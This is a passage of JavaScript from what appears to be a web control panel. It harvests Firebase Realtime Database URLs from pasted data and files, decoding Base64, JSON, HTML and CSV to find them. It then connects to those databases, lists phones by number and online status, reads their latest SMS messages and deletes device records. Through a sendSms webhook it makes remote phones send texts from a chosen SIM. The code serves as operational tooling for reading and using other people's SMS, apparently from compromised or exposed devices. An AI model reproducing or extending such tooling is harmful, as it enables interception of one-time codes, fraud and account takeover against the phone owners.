    if (Date.now() - startTime > UX_TIMEOUT_MS) return [];
    if (!input || typeof input !== 'string' || input.length > UX_MAX_INPUT_BYTES) return [];

    const results = [];
    const seenUrls = new Set();

    function addResult(url, name, src) {
      const clean = url.replace(/\/+$/, '');
      if (seenUrls.has(clean) || results.length >= UX_MAX_URLS) return;
      seenUrls.add(clean);
      results.push({ url: clean, name: name || nameFromFbUrl(clean), source: src });
    }

    function addAll(urls, src) {
      for (const u of urls) addResult(u, '', src);
    }

    // 1. Direct Firebase URL scan on raw text
    const directUrls = scanFirebaseUrls(input);
    addAll(directUrls, source || 'plain text');

    // 2. Try as URL — inspect query params and fragment
    if (/^https?:\/\//i.test(input.trim())) {
      try {
        const parsed = new URL(input.trim());
        // Check every query parameter value
        for (const [key, val] of parsed.searchParams) {
          if (!val) continue;
          // Direct Firebase URLs in param value
          const paramUrls = scanFirebaseUrls(val);
          addAll(paramUrls, `param "${key}"`);
          // Try Base64 decode
          if (looksLikeBase64(val)) {
            const decoded = tryBase64Decode(val);
            if (decoded) {
              const sub = deepExtract(decoded, `param "${key}" (Base64)`, depth + 1, startTime);
              for (const r of sub) addResult(r.url, r.name, r.source);
            }
          }
          // Try JSON parse
          try {
            const j = JSON.parse(val);
            const sub = extractFromJson(j, `param "${key}" (JSON)`, depth + 1, startTime);
            for (const r of sub) addResult(r.url, r.name, r.source);
          } catch { /* not JSON */ }
        }
        // Check fragment
        if (parsed.hash && parsed.hash.length > 1) {
          const frag = decodeURIComponent(parsed.hash.slice(1));
          const fragUrls = scanFirebaseUrls(frag);
          addAll(fragUrls, 'URL fragment');
          if (looksLikeBase64(frag)) {
            const decoded = tryBase64Decode(frag);
            if (decoded) {
              const sub = deepExtract(decoded, 'fragment (Base64)', depth + 1, startTime);
              for (const r of sub) addResult(r.url, r.name, r.source);
            }
          }
        }
      } catch { /* invalid URL, that's fine */ }
    }

    // 3. Try as JSON
    const trimmed = input.trim();
    if ((trimmed.startsWith('{') || trimmed.startsWith('[') || trimmed.startsWith('"')) && trimmed.length < UX_MAX_INPUT_BYTES) {
      try {
        const parsed = JSON.parse(trimmed);
        const sub = extractFromJson(parsed, source || 'JSON', depth + 1, startTime);
        for (const r of sub) addResult(r.url, r.name, r.source);
      } catch { /* not valid JSON */ }
    }

    // 4. Try as Base64
    if (looksLikeBase64(trimmed)) {
      const decoded = tryBase64Decode(trimmed);
      if (decoded) {
        const sub = deepExtract(decoded, source ? `${source} → Base64` : 'Base64 decode', depth + 1, startTime);
        for (const r of sub) addResult(r.url, r.name, r.source);
      }
    }

    // 5. Try URL-decoding
    try {
      const urlDecoded = decodeURIComponent(trimmed);
      if (urlDecoded !== trimmed) {
        const decodedUrls = scanFirebaseUrls(urlDecoded);
        addAll(decodedUrls, source ? `${source} (URL-decoded)` : 'URL-decoded');
      }
    } catch { /* not URL-encoded */ }

    return results;
  }

  /**
   * Recursively extract Firebase URLs from parsed JSON values.
   */
  function extractFromJson(val, source, depth, startTime) {
    if (depth > UX_MAX_DEPTH || Date.now() - startTime > UX_TIMEOUT_MS) return [];
    const results = [];

    if (typeof val === 'string') {
      // Scan the string for Firebase URLs
      const urls = scanFirebaseUrls(val);
      for (const u of urls) results.push({ url: u.replace(/\/+$/, ''), name: nameFromFbUrl(u), source });
      // Try Base64 decode on the string
      if (looksLikeBase64(val)) {
        const decoded = tryBase64Decode(val);
        if (decoded) {
          const sub = deepExtract(decoded, `${source} → Base64 value`, depth + 1, startTime);
          results.push(...sub);
        }
      }
      // Try nested JSON
      const t = val.trim();
      if ((t.startsWith('{') || t.startsWith('[')) && t.length > 2) {
        try {
          const nested = JSON.parse(t);
          const sub = extractFromJson(nested, `${source} → nested JSON`, depth + 1, startTime);
          results.push(...sub);
        } catch { /* not JSON */ }
      }
    } else if (Array.isArray(val)) {
      for (let i = 0; i < val.length && results.length < UX_MAX_URLS; i++) {
        const sub = extractFromJson(val[i], source, depth + 1, startTime);
        results.push(...sub);
      }
    } else if (val && typeof val === 'object') {
      for (const [k, v] of Object.entries(val)) {
        if (results.length >= UX_MAX_URLS) break;
        const sub = extractFromJson(v, source, depth + 1, startTime);
        // If the key looks like a name and we found URLs, attach the key as name
        for (const r of sub) {
          if (!r.name && k && typeof k === 'string' && k.length < 50 && !/^https?:\/\//.test(k)) {
            r.name = k;
          }
          results.push(r);
        }
      }
    }

    return results;
  }

  /**
   * Extract Firebase URLs from HTML/XML content
   */
  function extractFromHtml(text, source) {
    const results = [];
    const startTime = Date.now();
    // Extract attribute values (href, src, data-*, value, content)
    const attrRe = /(?:href|src|data-[a-z-]+|value|content)\s*=\s*["']([^"']{10,})["']/gi;
    let m;
    while ((m = attrRe.exec(text)) !== null && results.length < UX_MAX_URLS) {
      const sub = deepExtract(m[1], `${source} (attribute)`, 1, startTime);
      results.push(...sub);
    }
    // Also do a full text scan
    const textUrls = scanFirebaseUrls(text);
    for (const u of textUrls) {
      if (!results.find(r => r.url === u.replace(/\/+$/, ''))) {
        results.push({ url: u.replace(/\/+$/, ''), name: nameFromFbUrl(u), source });
      }
    }
    return results;
  }

  /**
   * Extract Firebase URLs from CSV content
   */
  function extractFromCsv(text, source) {
    const results = [];
    const startTime = Date.now();
    const lines = text.split(/\r?\n/);
    for (let i = 0; i < lines.length && results.length < UX_MAX_URLS; i++) {
      const cells = lines[i].split(/[,;\t]/);
      for (const cell of cells) {
        const sub = deepExtract(cell.trim().replace(/^["']|["']$/g, ''), `${source} row ${i + 1}`, 1, startTime);
        results.push(...sub);
      }
    }
    return results;
  }

  /**
   * Main entry point: run universal extraction on text input or file content.
   * @returns {{ results: {url,name,source}[], errors: string[], stats: {totalFound,duplicates,sources} }}
   */
  function universalExtract(input, filename) {
    const startTime = Date.now();
    const errors = [];

    if (!input || typeof input !== 'string') {
      return { results: [], errors: ['Input is empty.'], stats: { totalFound: 0, duplicates: 0, sources: 0 } };
    }

    if (input.length > UX_MAX_INPUT_BYTES) {
      return { results: [], errors: [`Input too large (${(input.length / 1024 / 1024).toFixed(1)} MB). Max is 5 MB.`], stats: { totalFound: 0, duplicates: 0, sources: 0 } };
    }

    let allResults = [];
    const src = filename || 'pasted input';

    // Determine handler by file extension
    const ext = (filename || '').split('.').pop()?.toLowerCase();

    if (ext === 'html' || ext === 'htm' || ext === 'xml') {
      allResults = extractFromHtml(input, src);
    } else if (ext === 'csv' || ext === 'tsv') {
      allResults = extractFromCsv(input, src);
    } else {
      // For everything else (json, txt, or pasted text): split by lines and process each
      const lines = input.split(/\r?\n/).map(l => l.trim()).filter(Boolean);

      if (lines.length <= 1) {
        // Single input — process as one unit
        allResults = deepExtract(input, src, 0, startTime);
      } else {
        // Multi-line: process each line independently, then whole block
        for (const line of lines) {
          if (allResults.length >= UX_MAX_URLS) break;
          if (Date.now() - startTime > UX_TIMEOUT_MS) {
            errors.push('Processing timed out. Some lines may not have been analyzed.');
            break;
          }
          const sub = deepExtract(line, src, 0, startTime);
          allResults.push(...sub);
        }
        // Also try parsing the whole block as JSON (e.g. multi-line JSON)
        const whole = input.trim();
        if ((whole.startsWith('{') || whole.startsWith('[')) && allResults.length < UX_MAX_URLS) {
          try {
            const parsed = JSON.parse(whole);
            const sub = extractFromJson(parsed, src, 0, startTime);
            allResults.push(...sub);
          } catch { /* not valid JSON as a whole */ }
        }
      }
    }

    // Deduplicate by URL
    const seen = new Set();
    const unique = [];
    const sourcesSet = new Set();
    let dupes = 0;
    for (const r of allResults) {
      const clean = r.url.replace(/\/+$/, '');
      if (seen.has(clean)) { dupes++; continue; }
      seen.add(clean);
      sourcesSet.add(r.source);
      unique.push({ ...r, url: clean });
    }

    if (!unique.length && !errors.length) {
      errors.push('No Firebase Realtime Database URLs found in the input.');
    }

    return {
      results: unique.slice(0, UX_MAX_URLS),
      errors,
      stats: {
        totalFound: allResults.length,
        duplicates: dupes,
        sources: sourcesSet.size
      }
    };
  }

  // ── Universal Extractor UI state ──────────────────────────────────────────
  let uxInput = $state('');
  let uxResults = $state([]);      // { url, name, source, selected }[]
  let uxErrors = $state([]);
  let uxStats = $state(null);      // { totalFound, duplicates, sources }
  let uxProcessing = $state(false);
  let uxDragActive = $state(false);
  let uxUploadedFiles = $state([]); // { name, size, resultCount }[]

  function uxRunExtract() {
    uxErrors = [];
    uxProcessing = true;
    // Use setTimeout to unblock UI
    setTimeout(() => {
      try {
        const { results, errors, stats } = universalExtract(uxInput);
        uxResults = results.map(r => ({ ...r, selected: true }));
        uxErrors = errors;
        uxStats = stats;
      } catch (e) {
        uxErrors = ['Unexpected error: ' + (e?.message || String(e))];
        uxResults = [];
        uxStats = null;
      } finally {
        uxProcessing = false;
      }
    }, 30);
  }

  function uxRunExtractFile(text, filename) {
    uxProcessing = true;
    setTimeout(() => {
      try {
        const { results, errors, stats } = universalExtract(text, filename);
        // Merge with existing results (dedup by URL)
        const existingUrls = new Set(uxResults.map(r => r.url));
        const newResults = results.filter(r => !existingUrls.has(r.url)).map(r => ({ ...r, selected: true }));
        uxResults = [...uxResults, ...newResults];
        if (errors.length) uxErrors = [...uxErrors, ...errors.map(e => `[${filename}] ${e}`)];
        uxUploadedFiles = [...uxUploadedFiles, { name: filename, size: text.length, resultCount: newResults.length }];
        // Update stats
        const totalFound = (uxStats?.totalFound || 0) + stats.totalFound;
        const duplicates = (uxStats?.duplicates || 0) + stats.duplicates + results.filter(r => existingUrls.has(r.url)).length;
        uxStats = { totalFound, duplicates, sources: (uxStats?.sources || 0) + stats.sources };
      } catch (e) {
        uxErrors = [...uxErrors, `[${filename}] Error: ${e?.message || String(e)}`];
      } finally {
        uxProcessing = false;
      }
    }, 30);
  }

  function uxHandleDrop(e) {
    e.preventDefault();
    uxDragActive = false;
    const files = e.dataTransfer?.files;
    if (files) uxProcessFiles(files);
  }

  function uxHandleDragOver(e) {
    e.preventDefault();
    uxDragActive = true;
  }

  function uxHandleDragLeave() {
    uxDragActive = false;
  }

  function uxHandleFileSelect(e) {
    const files = e.currentTarget?.files;
    if (files) uxProcessFiles(files);
    // Reset input so same file can be re-selected
    e.currentTarget.value = '';
  }

  function uxProcessFiles(fileList) {
    const textTypes = ['application/json', 'text/plain', 'text/csv', 'text/html', 'text/xml',
      'application/xml', 'text/tab-separated-values', 'application/x-ndjson'];
    const textExts = ['json', 'txt', 'csv', 'html', 'htm', 'xml', 'tsv', 'log', 'md', 'yaml', 'yml', 'ini', 'cfg', 'conf', 'toml', 'ndjson'];

    for (const file of fileList) {
      const ext = file.name.split('.').pop()?.toLowerCase() || '';
      const isText = textTypes.some(t => file.type.startsWith(t)) || textExts.includes(ext) || file.type === '';

      if (!isText) {
        uxErrors = [...uxErrors, `"${file.name}" appears to be a binary file and cannot be processed.`];
        continue;
      }
      if (file.size > UX_MAX_INPUT_BYTES) {
        uxErrors = [...uxErrors, `"${file.name}" is too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is 5 MB.`];
        continue;
      }

      const reader = new FileReader();
      reader.onload = () => {
        if (typeof reader.result === 'string') {
          uxRunExtractFile(reader.result, file.name);
        }
      };
      reader.onerror = () => {
        uxErrors = [...uxErrors, `Failed to read "${file.name}".`];
      };
      reader.readAsText(file);
    }
  }

  function uxRemoveResult(url) {
    uxResults = uxResults.filter(r => r.url !== url);
  }

  function uxToggleResult(url) {
    uxResults = uxResults.map(r => r.url === url ? { ...r, selected: !r.selected } : r);
  }

  function uxToggleAll() {
    const allSelected = uxResults.every(r => r.selected);
    uxResults = uxResults.map(r => ({ ...r, selected: !allSelected }));
  }

  function uxCopyUrl(url) {
    copyText(url);
    toast('URL copied!', 'success');
  }

  function uxCopyAllUrls() {
    const urls = uxResults.filter(r => r.selected).map(r => r.url).join('\n');
    if (!urls) return;
    copyText(urls);
    toast(`${uxResults.filter(r => r.selected).length} URLs copied!`, 'success');
  }

  function uxCopyAllDetails() {
    const lines = uxResults.filter(r => r.selected).map(r => `${r.name || 'Firebase'}|${r.url}|${r.source}`).join('\n');
    if (!lines) return;
    copyText(lines);
    toast('All details copied!', 'success');
  }

  function uxAddToBulk() {
    const selected = uxResults.filter(r => r.selected);
    if (!selected.length) { toast('No connections selected.', 'error'); return; }
    const existing = parseBulkFirebase(bulkText);
    const newUrls = selected.map(r => r.url).filter(u => !existing.includes(u));
    if (newUrls.length) {
      bulkText = [...existing, ...newUrls].join('\n');
      toast(`Added ${newUrls.length} URL${newUrls.length !== 1 ? 's' : ''} to Bulk list.`, 'success');
    } else {
      toast('All selected URLs are already in the Bulk list.', 'info');
    }
  }

  function uxClear() {
    uxInput = '';
    uxResults = [];
    uxErrors = [];
    uxStats = null;
    uxUploadedFiles = [];
  }

  function uxUpdateName(url, newName) {
    uxResults = uxResults.map(r => r.url === url ? { ...r, name: newName } : r);
  }

  // ── Editable bulk URL list (driven by bulkText) ───────────────────────────
  // Each item is { url: string, valid: bool, dup: bool }
  let bulkEditableUrls = $state([]);

  $effect(() => {
    const parsed = parseBulkFirebase(bulkText);
    bulkEditableUrls = parsed.map(url => ({
      url,
      valid: true,
      dup: !!connections.find(c => c.url.replace(/\/+$/, '') === url)
    }));
  });

  function removeBulkUrl(url) {
    // Remove from bulkText by filtering out that URL
    const lines = bulkText.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
    const filtered = lines.filter(l => !l.includes(url));
    bulkText = filtered.join('\n');
  }

  function updateBulkUrl(oldUrl, newUrl) {
    const trimmed = newUrl.trim();
    if (!trimmed) { removeBulkUrl(oldUrl); return; }
    bulkText = bulkText.replace(oldUrl, trimmed);
  }

  function copyAllBulkUrls() {
    const urls = bulkEditableUrls.map(u => u.url).join('\n');
    if (!urls) return;
    copyText(urls);
    toast('All URLs copied!', 'success');
  }

  function handleUrlPaste(e) {
    const pasted = e.clipboardData?.getData('text') || '';
    const found = parseBulkFirebase(pasted);
    if (found.length > 1) {
      e.preventDefault();
      bulkText = pasted;
      addPanelMode = 'bulk';
      toast(`Detected ${found.length} URLs — switched to Bulk mode`, 'info');
    }
  }

  function addBulkConns() {
    const urls = bulkParsed;
    if (!urls.length) { toast('No valid Firebase URLs found in text','error'); return; }
    let added = 0, skipped = 0;
    const newConns = [];
    for (const rawUrl of urls) {
      const dup = connections.find(c => c.url.replace(/\/+$/,'') === rawUrl)
               || newConns.find(c => c.url === rawUrl);
      if (dup) { skipped++; continue; }
      const id = `c${Date.now()}_${added}`;
      const color = ACCENT[(connections.length + newConns.length) % ACCENT.length];
      let name = '';
      try { name = new URL(rawUrl).hostname.split('-')[0]; } catch {}
      newConns.push({ id, name: name || 'Firebase', url: rawUrl, token:'', path:'messages', infoPath:'clients', color, enabled:true });
      added++;
    }
    if (newConns.length) {
      connections = [...connections, ...newConns];
      saveConnections(connections);
      for (const conn of newConns) fetchConn(conn);
    }
    bulkText = ''; addPanelMode = 'single'; addOpen = false;
    if (added && skipped) toast(`Added ${added} connection${added>1?'s':''}, skipped ${skipped} duplicate${skipped>1?'s':''}`, 'success');
    else if (added) toast(`Added ${added} connection${added>1?'s':''}`, 'success');
    else toast(`All ${skipped} URL${skipped>1?'s':''} already connected`, 'info');
  }

  function addConn() {
    const rawUrl = form.url.trim().replace(/\/+$/, "");
    if (!rawUrl) {
      toast("Firebase URL required", "error");
      return;
    }
    const dup = connections.find((c) => c.url.replace(/\/+$/, "") === rawUrl);
    if (dup) {
      toast(`Already connected as "${dup.name}" — refreshing`, "info");
      fetchConn(dup);
      addOpen = false;
      return;
    }
    const id = `c${Date.now()}`;
    const color = ACCENT[connections.length % ACCENT.length];
    let name = form.name.trim();
    try {
      if (!name) name = new URL(rawUrl).hostname.split("-")[0];
    } catch {}
    const conn = {
      ...form,
      url: rawUrl,
      id,
      color,
      name: name || "Firebase",
      enabled: true,
    };
    connections = [...connections, conn];
    saveConnections(connections); // persist immediately
    rawConnId = id;
    form = { name: "", url: "", token: "", path: "messages", infoPath: "" };
    addOpen = false;
    fetchConn(conn);
    toast(`Connected: ${conn.name}`, "success");
  }
  function toggleConn(id) {
    connections = connections.map((c) =>
      c.id === id ? { ...c, enabled: !c.enabled } : c,
    );
    saveConnections(connections); // persist enabled state
    const conn = connections.find((c) => c.id === id);
    if (conn?.enabled) fetchConn(conn);
  }
  function dropConn(id) {
    const conn = connections.find(c => c.id === id);
    if (!confirm(`Remove connection "${conn?.name || id}"?`)) return;
    connections = connections.filter((c) => c.id !== id);
    saveConnections(connections); // persist removal
    const { [id]: _, ...rest } = db;
    db = rest;
    // Clear selection if removed conn was selected
    if (selectedConnId === id) { selectedConnId = null; selectedKey = null; activeTab = 'overview'; }
    // Clear from FC selection
    if (fcSelected.has(id)) { const s = new Set(fcSelected); s.delete(id); fcSelected = s; }
  }

  // ── Firebase Connections Management page state ────────────────────────────
  let fcSearch = $state('');
  let fcStatusFilter = $state('all'); // 'all' | 'online' | 'offline'
  let fcSelected = $state(new Set()); // Set of conn ids
  let fcEditId = $state(null); // id of conn being edited inline
  let fcEditForm = $state({ name: '', url: '', path: '', infoPath: '', token: '' });
  let copiedKey = $state(''); // transient 'connId::field' for Copied! state
  let copiedTimer = null;

  let filteredConns = $derived(
    connStats.filter(c => {
      if (fcSearch) {
        const q = fcSearch.toLowerCase();
        if (!c.name.toLowerCase().includes(q) && !c.url?.toLowerCase().includes(q)) return false;
      }
      if (fcStatusFilter === 'online' && c.online === 0) return false;
      if (fcStatusFilter === 'offline' && c.online > 0) return false;
      if (fcStatusFilter === 'failed' && !c.error) return false;
      return true;
    })
  );

  function withCopied(key) {
    copiedKey = key;
    if (copiedTimer) clearTimeout(copiedTimer);
    copiedTimer = setTimeout(() => { copiedKey = ''; }, 1500);
  }

  function copyConnUrl(conn) {
    copyText(conn.url);
    withCopied(`${conn.id}::url`);
  }
  function copyConnName(conn) {
    copyText(conn.name);
    withCopied(`${conn.id}::name`);
  }
  function copyConnDetails(conn) {
    const line = `${conn.name} | ${conn.url} | ${conn.path || 'messages'} | ${conn.infoPath || ''}`;
    copyText(line);
    withCopied(`${conn.id}::details`);
  }

  function copyAllConnUrls() {
    const text = filteredConns.map(c => c.url).join('\n');
    copyText(text);
    toast(`Copied ${filteredConns.length} URLs!`, 'success');
  }
  function copyAllConnNames() {
    const text = filteredConns.map(c => c.name).join('\n');
    copyText(text);
    toast(`Copied ${filteredConns.length} names!`, 'success');
  }
  function copyAllConnDetails() {
    const text = filteredConns.map(c => `${c.name} | ${c.url} | ${c.path || 'messages'} | ${c.infoPath || ''}`).join('\n');
    copyText(text);
    toast(`Copied ${filteredConns.length} connection details!`, 'success');
  }

  function copySelectedConnUrls() {
    const sel = connections.filter(c => fcSelected.has(c.id));
    copyText(sel.map(c => c.url).join('\n'));
    toast(`Copied ${sel.length} selected URLs!`, 'success');
  }

  function fcToggleSelect(id) {
    const s = new Set(fcSelected);
    s.has(id) ? s.delete(id) : s.add(id);
    fcSelected = s;
  }
  function fcToggleAll() {
    if (fcSelected.size === filteredConns.length && filteredConns.length > 0) {
      fcSelected = new Set();
    } else {
      fcSelected = new Set(filteredConns.map(c => c.id));
    }
  }

  function fcStartEdit(conn) {
    fcEditId = conn.id;
    fcEditForm = { name: conn.name, url: conn.url, path: conn.path || 'messages', infoPath: conn.infoPath || '', token: conn.token || '' };
  }
  function fcCancelEdit() { fcEditId = null; }
  function fcSaveEdit() {
    const rawUrl = fcEditForm.url.trim().replace(/\/+$/, '');
    if (!rawUrl) { toast('Firebase URL required', 'error'); return; }
    connections = connections.map(c => c.id === fcEditId ? {
      ...c,
      name: fcEditForm.name.trim() || c.name,
      url: rawUrl,
      path: fcEditForm.path.trim() || 'messages',
      infoPath: fcEditForm.infoPath.trim(),
      token: fcEditForm.token,
    } : c);
    saveConnections(connections);
    // Immediately re-fetch the edited connection
    const updated = connections.find(c => c.id === fcEditId);
    if (updated) fetchConn(updated);
    fcEditId = null;
    toast('Connection updated!', 'success');
  }

  function fcRemoveSelected() {
    const sel = [...fcSelected];
    if (!sel.length) return;
    const names = sel.map(id => connections.find(c => c.id === id)?.name || id).join(', ');
    if (!confirm(`Remove ${sel.length} connection${sel.length > 1 ? 's' : ''}?\n${names}`)) return;
    connections = connections.filter(c => !sel.includes(c.id));
    saveConnections(connections);
    sel.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
    fcSelected = new Set();
    toast(`Removed ${sel.length} connection${sel.length > 1 ? 's' : ''}.`, 'success');
  }

  // ── Master toggle (enable / disable all) ──────────────────────────────
  let masterEnabled = $derived(connections.length > 0 && connections.every(c => c.enabled));

  function toggleAllConns() {
    const newState = !masterEnabled;
    connections = connections.map(c => ({ ...c, enabled: newState }));
    saveConnections(connections);
    if (newState) connections.forEach(c => fetchConn(c));
    toast(newState ? 'All connections enabled.' : 'All connections disabled.', 'success');
  }

  // ── Failed connections ────────────────────────────────────────────────
  let failedConns = $derived(connStats.filter(c => !!c.error));

  function removeFailedConns() {
    if (!failedConns.length) return;
    if (!confirm(`Remove ${failedConns.length} failed connection${failedConns.length > 1 ? 's' : ''}?\nThis cannot be undone.`)) return;
    const ids = failedConns.map(c => c.id);
    connections = connections.filter(c => !ids.includes(c.id));
    saveConnections(connections);
    ids.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
    if (fcSelected.size) fcSelected = new Set([...fcSelected].filter(id => !ids.includes(id)));
    toast(`Removed ${ids.length} failed connection${ids.length > 1 ? 's' : ''}.`, 'success');
  }

  // ── Select device ─────────────────────────────────────────────────────────
  function selectDevice(connId, key) {
    selectedConnId = connId;
    selectedKey = key;
    msgs = null;
    msgsFilter = "all";
    msgsSearch = "";
    activeTab = "device";
    sideOpen = false; // close sidebar on mobile after selecting a device
  }

  // ── Load Messages (all SMS for selected device) ───────────────────────────
  async function loadMessages() {
    const conn = connections.find((c) => c.id === selectedConnId);
    if (!conn || !selectedKey) return;
    msgsLoading = true;
    msgs = null;
    try {
      // Fetch only last 50 messages, newest first
      const { data } = await apiFetch(
        conn,
        `${conn.path}/${selectedKey}`,
        "GET",
        undefined,
        { orderBy: '"$key"', limitToLast: "50" },
      );
      msgs = data && typeof data === "object" ? data : {};
    } catch (e) {
      toast(e.message, "error");
      msgs = {};
    } finally {
      msgsLoading = false;
    }
  }

  // ── Send SMS ─────────────────────────────────────────────────────────────
  // Confirmed from network log:
  //   PUT clients/<deviceKey>/webhookEvent/sendSms.json?auth=<dbUrl>
  //   Body: { from:1, to:"9885124921", message:"...", isSended:false }
  async function doSendSMS() {
    const conn = connections.find((c) => c.id === selectedConnId);
    if (!conn || !selectedKey) return;
    const raw = smsDraft.to.trim();
    const to = raw.replace(/\D/g, ""); // digits only (gateway expects no +91 prefix)
    const message = smsDraft.body.trim();
    if (!to || !message) {
      toast("Enter phone number and message", "error");
      return;
    }
    smsSending = true;
    try {
      const base = conn.url.replace(/\/+$/, "");
      const authParam = encodeURIComponent(conn.url);
      const url = `${base}/clients/${selectedKey}/webhookEvent/sendSms.json?auth=${authParam}`;
      const payload = {
        from: parseInt(smsDraft.sim) + 1,
        to,
        message,
        isSended: false,
      };
      console.log("[SendSMS] PUT", url, payload);
      const res = await fetch(url, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
      toast("SMS sent ✓", "success");
      smsDraft = { to: "", body: "", sim: "0" };
    } catch (e) {
      console.error("[SendSMS] failed:", e);
      toast(`Send failed: ${e.message}`, "error");
    } finally {
      smsSending = false;
    }
  }

  // ── Delete device key ─────────────────────────────────────────────────────
  async function deleteDevice(conn, key) {
    if (!confirm(`Delete all messages for "${key}" from ${conn.name}?`)) return;
    try {
      await apiFetch(conn, `${conn.path}/${key}`, "DELETE");
      markDeleted(conn.id, key); // persist locally so it stays gone after refresh
      toast(`Deleted "${key}"`, "success");
      if (selectedKey === key && selectedConnId === conn.id) {
        selectedKey = null;
        selectedConnId = null;
        activeTab = "overview";
      }
      fetchConn(conn);
    } catch (e) {
      toast(e.message, "error");
    }
  }

  // ── Raw ──────────────────────────────────────────────────────────────────
  async function sendRaw() {
    const conn = connections.find((c) => c.id === rawConnId);
    if (!conn) return;
    rawLoading = true;
    rawRes = null;
    try {
      const opts = {
        method: rawMethod,
        headers: { "Content-Type": "application/json" },
      };
      if (["POST", "PUT", "PATCH"].includes(rawMethod)) opts.body = rawBody;
      const res = await fetch(buildUrl(conn, rawPath || conn.path), opts);
      const json = await res.json();
      rawRes = { status: res.status, ok: res.ok, data: json };
      if (res.ok) {
        toast(`${rawMethod} → ${res.status}`, "success");
        fetchConn(conn);
      } else toast(`Error ${res.status}`, "error");
    } catch (e) {
      rawRes = { error: e.message };
      toast(e.message, "error");
    } finally {
      rawLoading = false;
    }
  }

  function switchTab(tab) {
    activeTab = tab;
    if (tab === "messages" && selectedKey) loadMessages();
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function getDevInfo(connId, key) {
    // Returns device info from infoPath if available
    return db[connId]?.info?.[key] ?? null;
  }
  function getLatestMsg(connId, key) {
    // Get count of messages from keys
    const entry = db[connId];
    return entry?.keys?.[key] === true ? Object.keys(entry.keys).length : 0;
  }

  // ── Derived ───────────────────────────────────────────────────────────────
  let allDevices = $derived(
    (() => {
      const list = [];
      for (const conn of connections) {
        if (!conn.enabled) continue;
        const entry = db[conn.id];
        if (!entry?.keys || typeof entry.keys !== "object") continue;
        for (const key of Object.keys(entry.keys)) {
          if (typeof key !== "string" || key.length < 4) continue;
          if (isDeleted(conn.id, key)) continue; // skip locally deleted devices
          const info = entry.info?.[key] ?? null;
          list.push({ connId: conn.id, conn, key, info });
        }
      }
      return list;
    })(),
  );

  // Message count per device is the number of children keys
  function getMsgCount(connId, key) {
    const entry = db[connId];
    if (!entry?.keys) return 0;
    // keys from shallow root are the device keys, count comes from the device's own shallow fetch
    return 0; // We don't pre-load message counts; too expensive
  }

  // ── Unified search matching (device key, local added phone, Firebase phone, connection name, info) ──
  function matchDeviceSearch(d, query) {
    if (!query) return true;
    const q = query.toLowerCase().trim();
    if (!q) return true;
    // 1. Match device key / ID
    if (d.key.toLowerCase().includes(q)) return true;
    // 2. Match phone number (both local added phone number and Firebase phone)
    const phone = getDisplayPhone(d.connId, d.key, d.info);
    if (phone) {
      if (phone.toLowerCase().includes(q)) return true;
      const cleanPhone = phone.replace(/\D/g, "");
      const cleanQ = q.replace(/\D/g, "");
      if (cleanQ.length > 0) {
        if (cleanPhone.includes(cleanQ)) return true;
        const q10 = cleanQ.length >= 10 ? cleanQ.slice(-10) : null;
        const p10 = cleanPhone.length >= 10 ? cleanPhone.slice(-10) : null;
        if (q10 && cleanPhone.includes(q10)) return true;
        if (p10 && cleanQ.includes(p10)) return true;
      }
    }
    // Check original Firebase phone if overridden by local number
    const rawFmt = fmtPhone(d.info);
    if (rawFmt && rawFmt !== phone) {
      if (rawFmt.toLowerCase().includes(q)) return true;
      const cleanRaw = rawFmt.replace(/\D/g, "");
      const cleanQ = q.replace(/\D/g, "");
      if (cleanQ.length > 0) {
        if (cleanRaw.includes(cleanQ)) return true;
        const q10 = cleanQ.length >= 10 ? cleanQ.slice(-10) : null;
        const p10 = cleanRaw.length >= 10 ? cleanRaw.slice(-10) : null;
        if (q10 && cleanRaw.includes(q10)) return true;
        if (p10 && cleanQ.includes(p10)) return true;
      }
    }
    // 3. Match Firebase connection name
    if (d.conn?.name?.toLowerCase().includes(q)) return true;
    // 4. Match Firebase info JSON (model, ip, etc.)
    if (d.info && JSON.stringify(d.info).toLowerCase().includes(q)) return true;
    return false;
  }

  let filteredSide = $derived(
    allDevices.filter((d) => {
      if (searchQuery && !matchDeviceSearch(d, searchQuery)) return false;
      const on = d.info ? isOnline(d.info) : null;
      if (sideFilter === "on" && on !== true) return false;
      if (sideFilter === "off" && on === true) return false;
      if (sideFilter === "num" && !getDisplayPhone(d.connId, d.key, d.info))
        return false;
      if (sideFilter === "numOn" && !(on === true && getDisplayPhone(d.connId, d.key, d.info)))
        return false;
      if (sideFilter === "used" && !isUsed(`dev::${d.connId}::${d.key}`))
        return false;
      return true;
    }),
  );

  let totalCount = $derived(allDevices.length);
  let onlineCount = $derived(
    allDevices.filter((d) => d.info && isOnline(d.info)).length,
  );
  let offlineCount = $derived(
    allDevices.filter((d) => !d.info || isOnline(d.info) !== true).length,
  );
  let numCount = $derived(
    allDevices.filter((d) => getDisplayPhone(d.connId, d.key, d.info)).length,
  );
  let onlineNumCount = $derived(
    allDevices.filter(
      (d) =>
        d.info && isOnline(d.info) && getDisplayPhone(d.connId, d.key, d.info),
    ).length,
  );
  let newCount = $derived(newDeviceKeys.size);

  // Filtered device list — AND logic across all active filters
  let filteredTableDevices = $derived(
    allDevices.filter((d) => {
      if (tableSearch && !matchDeviceSearch(d, tableSearch)) return false;
      if (tableConnFilter && d.connId !== tableConnFilter) return false;
      const on = d.info ? isOnline(d.info) : null;
      const uid = `${d.connId}::${d.key}`;
      if (tableActiveFilters.has("on") && on !== true) return false;
      if (tableActiveFilters.has("off") && on === true) return false;
      if (
        tableActiveFilters.has("num") &&
        !getDisplayPhone(d.connId, d.key, d.info)
      )
        return false;
      if (
        tableActiveFilters.has("used") &&
        !isUsed(`dev::${d.connId}::${d.key}`)
      )
        return false;
      if (tableActiveFilters.has("new") && !newDeviceKeys.has(uid))
        return false;
      return true;
    }),
  );

  let totalDevicePages = $derived(
    Math.max(1, Math.ceil(filteredTableDevices.length / DEVICES_PER_PAGE)),
  );

  function toggleTableFilter(f) {
    const next = new Set(tableActiveFilters);
    // 'on' and 'off' are mutually exclusive
    if (f === "on" && next.has("on")) {
      next.delete("on");
    } else if (f === "on") {
      next.add("on");
      next.delete("off");
    } else if (f === "off" && next.has("off")) {
      next.delete("off");
    } else if (f === "off") {
      next.add("off");
